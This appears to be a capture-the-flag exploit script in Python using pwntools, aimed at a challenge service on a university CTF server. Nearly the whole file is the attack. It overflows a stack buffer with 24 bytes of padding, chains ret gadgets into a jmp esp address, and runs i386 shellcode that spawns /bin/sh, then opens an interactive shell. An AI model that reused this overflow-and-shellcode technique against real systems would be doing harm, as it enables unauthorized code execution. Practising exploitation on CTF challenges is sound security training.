#!/usr/bin/env python

from pwn import *

# r = process('./foo_2')
r = remote('bamboofox.cs.nctu.edu.tw', 10102)

context.arch = 'i386'

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
ret = 0x08048322
jmp_esp = 0x080485a0

r.sendline('a' * 24 + flat([ret, ret, ret, ret, jmp_esp]) + shellcode)

r.interactive()
